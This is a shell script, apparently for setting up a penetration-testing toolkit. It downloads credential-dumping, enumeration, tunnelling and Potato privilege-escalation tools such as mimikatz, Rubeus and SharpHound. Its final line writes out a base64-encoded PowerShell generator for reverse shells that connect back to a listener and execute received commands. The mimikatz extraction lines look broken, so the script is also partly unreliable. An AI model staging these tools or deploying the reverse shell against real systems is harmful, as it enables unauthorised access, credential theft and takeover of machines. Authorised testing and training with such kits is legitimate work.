echo "Creating directories"
mkdir tools
mkdir ./tools/w/
mkdir ./tools/l/
mkdir ./tools/p/

echo "Copying over enumeration scripts"
echo "\tInstalling WinPeas"
wget https://github.com/carlospolop/PEASS-ng/releases/download/20231105-d387d97f/winPEAS.bat
mv winPEAS.bat tools/w/winPEAS.bat
wget https://github.com/carlospolop/PEASS-ng/releases/download/20231105-d387d97f/winPEASx64.exe
mv winPEASx64.exe tools/w/winpeas.exe

echo "\tInstalling LinPeas"
wget https://github.com/carlospolop/PEASS-ng/releases/download/20231105-d387d97f/linpeas.sh
mv linpeas.sh tools/l/linpeas.sh

echo "\tInstalling SharpHound"
wget https://github.com/BloodHoundAD/SharpHound/releases/download/v2.0.1/SharpHound-v2.0.1.zip
unzip SharpHound-v2.0.1.zip SharpHound.exe SharpHound.ps1
mv SharpHound.exe tools/w/SharpHound.exe
mv SharpHound.ps1 tools/w/SharpHound.ps1
rm SharpHound-v2.0.1.zip

echo "Copying over Priv-esc scripts"
echo "\tInstalling Enable All Tokens"
wget https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1
mv EnableAllTokenPrivs.ps1 tools/w/EnableAllTokenPrivs.ps1


echo "\tCopying over Mimikatz"
wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip
unzip mimikatz_trunk.zip x64/mimikatz
mv mimikatz.exe tools/w/milmikatz.exe
rm mimikatz_trunk.zip

echo "\tCopying over Rubeus"
cp `find / -name "Rubeus.exe" 2>/dev/null | grep -i "ghostpack" | grep -v -i "dotnet"` tools/w/

echo "Installing Pivoting Tools"
echo "\tInstalling Nimscan"
wget https://github.com/elddy/NimScan/releases/download/1.0.8/NimScan.exe
mv NimScan.exe tools/w/NimScan.exe

echo "\tCopying over powercat"
cp /usr/share/windows-resources/powercat/powercat.ps1 tools/w/powercat.ps1

echo "Installing Priv-esc tools"
echo "\tInstalling Printspoofer"
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
mv PrintSpoofer64.exe tools/w/PrintSpoofer64.exe

echo "\tInstalling RoguePotato"
wget https://github.com/antonioCoco/RoguePotato/releases/download/1.0/RoguePotato.zip
unzip RoguePotato.zip RoguePotato.exe
mv RoguePotato.exe tools/w/RoguePotato.exe
rm RoguePotato.zip

echo "\tInstalling JuicyPotato"
wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
mv JuicyPotato.exe tools/w/JuicyPotato.exe

echo "\tInstalling GodPotato .Net 3.5"
wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET35.exe
mv GodPotato-NET35.exe tools/w/GodPotato-NET35.exe

echo "Installing external tools"
echo "\tInstalling Chisel"
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
gunzip chisel_1.9.1_windows_amd64.gz
gunzip chisel_1.9.1_linux_amd64.gz
mv chisel_1.9.1_windows_amd64 tools/w/chisel.exe
mv chisel_1.9.1_linux_amd64 tools/l/chisel


echo "\tInstalling Kerbrute"
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_amd64.exe
mv kerbrute_windows_amd64.exe tools/w/kerbrute.exe

echo "Installing Python Uploadserver"
pip3 install uploadserver

echo "Installing Linux PID Network Information extractor"
wget https://raw.githubusercontent.com/indirektly/utilities/main/Red_team_tools/proc_pid_network_extractor.py
mv proc_pid_network_extractor.py tools/l/proc_pid_network_extractor.py

echo "Creating powershell Reverse Shell b64 generator"
echo "JElQID0gUmVhZC1Ib3N0IC1Qcm9tcHQgJ0lucHV0IHlvdXIgbGlzdGVuZXJzIElQJwokUG9ydCA9IFJlYWQtSG9zdCAtUHJvbXB0ICdJbnB1dCB5b3VyIGxpc3RlbmVycyBwb3J0JwoKJFRleHQgPSAnJGNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRDUENsaWVudCgiJysgJElQICsgJyIsJyArICRQb3J0ICsgJyk7JHN0cmVhbSA9ICRjbGllbnQuR2V0U3RyZWFtKCk7W2J5dGVbXV0kYnl0ZXMgPSAwLi42NTUzNXwlezB9O3doaWxlKCgkaSA9ICRzdHJlYW0uUmVhZCgkYnl0ZXMsIDAsICRieXRlcy5MZW5ndGgpKSAtbmUgMCl7OyRkYXRhID0gKE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5UZXh0LkFTQ0lJRW5jb2RpbmcpLkdldFN0cmluZygkYnl0ZXMsMCwgJGkpOyRzZW5kYmFjayA9IChpZXggJGRhdGEgMj4mMSB8IE91dC1TdHJpbmcgKTskc2VuZGJhY2syID0gJHNlbmRiYWNrICsgIlBTICIgKyAocHdkKS5QYXRoICsgIj4gIjskc2VuZGJ5dGUgPSAoW3RleHQuZW5jb2RpbmddOjpBU0NJSSkuR2V0Qnl0ZXMoJHNlbmRiYWNrMik7JHN0cmVhbS5Xcml0ZSgkc2VuZGJ5dGUsMCwkc2VuZGJ5dGUuTGVuZ3RoKTskc3RyZWFtLkZsdXNoKCl9OyRjbGllbnQuQ2xvc2UoKScKJEJ5dGVzID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VW5pY29kZS5HZXRCeXRlcygkVGV4dCkKJEVuY29kZWRUZXh0ID1bQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKCRCeXRlcykKZWNobyAkRW5jb2RlZFRleHQ=" | base64 -d > tools/w/win_reverse_shell_gen.ps1